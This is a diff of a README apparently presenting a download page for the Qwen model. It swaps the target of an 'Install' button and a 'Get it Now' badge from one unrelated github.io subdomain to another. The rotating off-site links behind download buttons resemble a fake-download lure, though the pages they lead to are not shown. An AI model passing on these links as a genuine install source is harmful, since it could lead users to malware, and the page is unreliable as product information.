@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/qwen)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/qwen)
 
 </div>
 
@@ -81,7 +81,7 @@ Qwen's multilingual capability, particularly its strength in Chinese language pr
 
 <p align="center">
 
-[![Get it Now Qwen](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/qwen)
+[![Get it Now Qwen](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/qwen)
 
 </p>
 
